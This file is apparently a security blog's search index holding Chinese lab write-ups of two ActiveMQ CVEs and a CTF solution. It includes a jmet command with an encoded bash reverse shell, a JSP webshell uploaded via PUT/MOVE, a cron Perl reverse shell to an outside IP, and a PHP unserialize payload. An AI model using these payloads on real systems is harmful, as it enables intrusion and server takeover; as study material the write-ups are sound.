<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ActiveMQ反序列化漏洞(CVE-2015-5254)</title>
    <url>/2024/05/30/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254/</url>
    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是漏洞复现第一章了吧</p>
<p>目标:</p>
<p>· 看这些大漏洞在实际的应用</p>
<p>· 品味吸收发现漏洞和挖掘漏洞的过程</p>
<p>· 修复漏洞</p>
<p>· 思维发散，思考有没有其他地方会有同样的漏洞</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。本质上还是对JMS的攻击，ActiveMQ不过是一个触发反序列化的跳板。</p>
<p>有关JMS Attack的文章：</p>
<p><a class="link"   href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" >us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf (blackhat.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>上一篇的翻译</p>
<p><a class="link"   href="https://www.anquanke.com/post/id/84954" >【技术分享】使用反序列化漏洞干掉你的JMS-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>在发送object消息时的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//send</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendObjectMessage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    jmsTemplate.send(<span class="keyword">new</span> <span class="title class_">MessageCreator</span>() &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Message <span class="title function_">createMessage</span><span class="params">(Session session)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Staff</span>(<span class="number">1</span>, <span class="string">&quot;搬砖工&quot;</span>); <span class="comment">// Staff必须实现序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(staff);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//receive</span></span><br><span class="line"> <span class="comment">// 如果是Object消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> ObjectMessage) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjectMessage</span> <span class="variable">om</span> <span class="operator">=</span> (ObjectMessage) message;</span><br><span class="line"></span><br><span class="line">      <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> (Staff) om.getObject();</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;ConsumerService从队列&quot;</span> + destination.toString() + <span class="string">&quot;收到了消息：\t&quot;</span> + staff);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>又到了我们最喜欢的getObject()环节</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530143111195.png"  alt="image-20240530143111195"></p>
<p>由于ActiveMQ的调试的debug有点复杂，也没来得及看源码</p>
<p>不过如果你作为挖掘者，在知道以上信息的情况下，一定会源码都不用看，就应该合理猜测在ActiveMQ管理界面中接受消息，就等于执行了以上的receive代码吧，其实真的也不是我懒啦，这确实不用看，直接去试一波就好</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先用nmap扫扫</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151309225.png"  alt="image-20240530151309225"></p>
<p>发现了61616端口扫出是apachemq的发出端口，不知道为什么管理的端口没扫出来（pass，就当扫出来了）</p>
<p><img   src="/../img/$%7Bfiilename%7D/ok-1717053248889-1.jpg"  alt="ok"></p>
<p>wow，我们成功发现了后台界面(＾－＾)V</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151454795.png"  alt="image-20240530151454795"></p>
<p>什么，居然用admin和admin就登陆进去了（）</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151523882.png"  alt="image-20240530151523882"></p>
<p>居然正是漏洞版本，太巧了吧（</p>
<p>然后我们像接受端口发送信息，然后在在这个界面接受，不就触发了一个反序列化吗</p>
<p>这里需要用到一个工具jmet（查了一下好像就是类似个攻击脚本吧，真好，永远有配套服务）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载jmet的jar包</span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">#创建external目录，报错让创建的。。。。。。</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure>

<p>之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;cp README.txt README1.txt&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170736613.png"  alt="image-20240530170736613"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170748146.png"  alt="image-20240530170748146"></p>
<p>这样就算成功啦，之后反弹shell即可，需要编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTc3LjI0MS8yMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240530171632750.png"  alt="image-20240530171632750"></p>
<p>getshell  !!!!!</p>
<h1 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h1><p>1.拒绝反序列化危险的类</p>
<p>2.解决前台弱口令问题</p>
<p>3.隐藏接受信息的端口</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>ActActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)</title>
    <url>/2024/05/31/ActActiveMQ-Arbitrary-File-Write-Vulnerability-CVE-2016-3088/</url>
    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>

<h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><p>5,14.0之前的版本</p>
<p>5.12.x~5.13.x:需要开启fileserver应用(此应用默认关闭)</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。</p>
<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
<h1 id="漏洞详细"><a href="#漏洞详细" class="headerlink" title="漏洞详细"></a>漏洞详细</h1><p>既然可以写入文件并且可以移动，那就会有下面四种方法，不过只能复现成功前两种，看了很多文章3,4好像也没什么人复现出来，而p神也只留下一句话：理论上可以，但尚未测试。。。。。。。。有种费马解费马大定理的美，然后我自己的功力当然也是做不到了的</p>
<ol>
<li>写入webshell</li>
<li>写入cron</li>
<li>写入jar或jetty.xml等库和配置文件</li>
<li>写入ssh key</li>
</ol>
<h1 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h1><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>PUT</code> 请求用于向服务器更新指定资源，可以理解为对服务器上的资源进行修改操作。使用 <code>PUT</code> 请求方式会覆盖原有的资源内容，因此需要谨慎使用。</p>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>本地一直没弄成功,PUT方法是一直被锁的</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531142351189.png"  alt="image-20240531142351189"></p>
<p><a class="link"   href="https://www.cnblogs.com/kuoaidebb/p/4466602.html" >HTTP - PUT 上传文件&#x2F;Shell - 阔爱的贝贝 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>不过这put虽说可以上传，但是上传的目录是被锁死的，只要这个目录里不解析webshell也没辙，主要是这个Move有点伤</p>
<h2 id="Move请求"><a href="#Move请求" class="headerlink" title="Move请求"></a>Move请求</h2><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>linux上的定时任务</p>
<p><a class="link"   href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" >Linux Crontab 定时任务 | 菜鸟教程 (runoob.com)<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240531151440878.png"  alt="image-20240531151440878"></p>
<p>每隔一分钟复制1.txt成2.txt到根目录，当然这个命令只能执行一次，因为不能同名吧，我主要想实验是发起任务的那一刻开启做，还是一分钟后开始做</p>
<p>使用crontab命令是把定时任务设置在&#x2F;tmp&#x2F;crontab里的，名字随机，不好推出了并且写入</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152305281.png"  alt="image-20240531152305281"></p>
<p>所以我们找到可以直接写入的<code>/etc/cron.d</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152513931.png"  alt="image-20240531152513931"></p>
<p>有三个用户，一般使用root用户</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开日</p>
<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240531155110593.png"  alt="image-20240531155110593"></p>
<p>弱口令爆破admin&#x2F;admin</p>
<p>访问已经站点<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>信息收集</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531155345986.png"  alt="image-20240531155345986"></p>
<p>我们只需要两个信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activemq.base	/opt/activemq  #网站根目录，会解析jsp木马文件</span><br><span class="line">user.name	root               #/etc/cron.d目录所有者是root，若这里不是root估计打不成功</span><br></pre></td></tr></table></figure>

<p>接着我们向fileserver上传文件</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>779</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader &#123;</span></span><br><span class="line"><span class="language-gradle">U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">super</span>(c);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span>[] b) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"> </span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.<span class="keyword">class</span>).invoke(clazz.newInstance(), str);</span></span><br><span class="line"><span class="language-gradle">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.<span class="keyword">class</span>).invoke(decoder, str);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle">String cls = request.getParameter(<span class="string">&quot;ewoji&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>

<p>记住后缀不能是jsp</p>
<p>接着Move</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/ewoji.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功将木马打入</p>
<p>注意这里ewoji.txt一定要和ewoji.jsp前缀名字相同，不然会把ewoji.jsp视为一个文件，fileserver会异常关闭，就打不了了呀</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531215835511.png"  alt="image-20240531215835511"></p>
<p>antsword启动</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161710100.png"  alt="image-20240531161710100"></p>
<p>需要admin权限，记得加请求头</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161641254.png"  alt="image-20240531161641254"></p>
<p>getshell !!!!</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531221257330.png"  alt="image-20240531221257330"></p>
<h2 id="写入crontab"><a href="#写入crontab" class="headerlink" title="写入crontab"></a>写入crontab</h2><p>大致和上面的一样，就是不用登录</p>
<p>上传</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;47.100.177.241&quot;</span>;<span class="variable">$p</span>=<span class="number">23333</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240606143921794.png"  alt="image-20240606143921794"></p>
<p>如果是用bp，请确保正文最后是\n而不是\r\n</p>
<p>移动</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>

<p>等待一下</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240606144408059.png"  alt="image-20240606144408059"></p>
<p>getshell !!!</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.对上传的文件内容进行检测</p>
<p>2.限制move方法</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
      <tags>
        <tag>复现</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>HDCTF Junior 2024 Winter WP</title>
    <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
    <content><![CDATA[<h1 id="新生选拔赛"><a href="#新生选拔赛" class="headerlink" title="新生选拔赛"></a>新生选拔赛</h1><span id="more"></span>

<h1 id="朴实无华的http"><a href="#朴实无华的http" class="headerlink" title="朴实无华的http"></a>朴实无华的http</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240222183840891.png" ></p>
<p>这是刚刚拿到题的样子,F12没反应,ctrl+U看看</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222183956685.png" ></p>
<p>没什么卵用,只知道把F12和F1 ban掉了</p>
<p>题目没给什么描述,源码也没有信息,直接开扫,dirsearch.py启动!</p>
<p>最后扫出来个robot.txt</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184449835.png" ></p>
<p>进入你，httttttp.php</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184604048.png" ></p>
<p>接下来就很常规的把Referer,UA填好,就进入了经典试ip环节,用收集的词典在burpsuite爆一下就出来了.</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185535104.png"  alt="兄弟爆一下，说说你心里话"></p>
<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>最想吐的一集，虽然拿了个一血，但这题差点把我血都放完了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185800522.png" ></p>
<p>因为一开始服务器挺卡的，点这题老是调到别的地方，我还以为题目出错了，一看原来有个$_GET[‘entrance’]，够坏哈</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这题的思路到是比较明确，想出来并不要多少时间,漏洞点是在$fuction($cmd),于是我们对这两个值进行覆盖即可rce，</p>
<p>那么就反推回去</p>
<p>什么能触发invoke呢—&gt;damn类中的toString可以触发,什么触发toString—&gt;类pop的set，什么触发set—&gt;类air的call,什么触发call—&gt;类hnusec的destruct</p>
<p>开始下手</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>这里的base64解码编码，private变量旁边的%00弄得我好崩溃.</p>
<p>先看我的payload:</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222190634907.png" ></p>
<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”%00pop%00exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
<p>以为到这里就差不多得了?想多了</p>
<h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p>这个需要版本限制，具体不记得</p>
<p>我们知道wakeup触发时机是在unserialize之前，那么这里我们肯定不能让它触发.</p>
<p>绕过的方式是:修改pop链属性个数使他大于真实个数即可绕过</p>
<h2 id="private旁边的-00"><a href="#private旁边的-00" class="headerlink" title="private旁边的%00"></a>private旁边的%00</h2><p>这里够我喝一壶的了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222191033249.png" ></p>
<p>注意看，这个变量叫pop,它的两边有两个不知道什么东西的东西,其实它是ASCII里面的0，在url中是%00.</p>
<p>按我之前的经验来看，我们只需手动添加%00在pop两边，接着$_GET传参即可,但是你先别急</p>
<p>这里GET传进去的pop链是要经过base64编码解码的，于是像上面说的这样子干，那么我们传入的便是%00,而不是经过服务器解析后的那个符号0,所以php理所当然是识别不了%00的，所以识别不了pop，一个地方崩整个崩</p>
<p>问题到这里很明确了——如何让php识别pop旁边那两个东西呢?这里用php中的chr()函数，它会将ascii十进制数转化为符号,我们还要注意字符串的拼接用.来连接</p>
<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”‘<strong>.chr(0).</strong>‘pop’<strong>.chr(0).</strong>‘exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
<p>接着就是无限制的rce，不多赘述</p>
<h1 id="フィナーレ。"><a href="#フィナーレ。" class="headerlink" title="フィナーレ。"></a>フィナーレ。</h1><p>这题是考察php特性和无参数rce</p>
<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192112186.png" ></p>
<p>这里是强等于,0e绕过不能用,那就用数组绕过,当md5()里面传入一个数组时，编译器会报错但不影响它继续执行后返回null，结果null&#x3D;&#x3D;&#x3D;null，成功绕过</p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192647039.png" ></p>
<p>这里直接传入114514就好了，目的应该不是考察intval绕过，让我们认识这个函数而已</p>
<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222193337316.png" ></p>
<p>说是命令执行，但这样写没反应，应该是有过滤，抓个包看看</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222193645229.png" ></p>
<p>果然啊，果然，过滤了好多，linux指令在这里我是不会用了,用php的函数写的</p>
<p>scandir():查看目录下有什么文件,传的参数就是路径</p>
<p>readfile():读取文件</p>
<p>这里先print_r(scandir(.))查看根目录(为什么是print_r不是echo,因为这里返回的是数组，echo处理不了)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194101516.png" ></p>
<p>这里我们在前三层找到flag文件，读取</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194422918.png" ></p>
<p>这里的readfile()平替很多,比如highlight_file,show_source,网上还有几个吧</p>
<h1 id="カゲロウデイズ"><a href="#カゲロウデイズ" class="headerlink" title="カゲロウデイズ"></a>カゲロウデイズ</h1><p>运气最好的一集，说是考察脚本能力，但我一个脚本没写，全靠运气</p>
<p>题目说了密码在css文件里面</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194810531.png" ></p>
<p>这里我们复制下来，在记事本可以把注释批量去掉</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194905273.png" ></p>
<p>一看就是base64，但我做到这里的时候没有去解码，而是直接拿去burpsuite爆了，结果啥都没爆出来，然后我就拿去解码了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222195102450.png" ></p>
<p>然后我想是不是要写个脚本把这些字符拼接起来，然后我在乱翻的时候，哎哟我，这不key is 谁谁谁吗，然后直接拿去试，还真得了，全靠运气<img   src="/../img/$%7Bfiilename%7D/image-20240222195234074.png" ></p>
<p>又是点击题，反正上次也是用连点器做出来的，这次也用了，没想到了设置了点击间隔时间的限制，然后我调到0.2s点一次完了给他挂个30来分钟就出来了，就当休息一下哈哈哈</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>  记录一下第一次打的完整的ctf，早上准备开打的时候简直兴奋的发抖，打开题目像癫了一样乱搞，现在回想还真是浪费精力啊，这是一场持久战，还是得慢慢来,最后也是差一题ak，已经超出我的预期了。</p>
<p>  复盘了一下今天的操作，感觉有几方面需要说出来指正</p>
<p>  1.资料乱开，又不关，导致全面页面，乱糟糟(最后burpsuite还差点干爆我电脑)</p>
<p>  2.没有备份的习惯，解题过程中看到的很多信息都是要记录的，今天重新复制粘贴占了蛮多时间</p>
<p>  3.赛前准备不足，虽然知道今天应该会有http的题，但是忘记去找ip了，今天去找又花了蛮久，痛啊</p>
<p>道阻且长，同志们还需努力.</p>
]]></content>
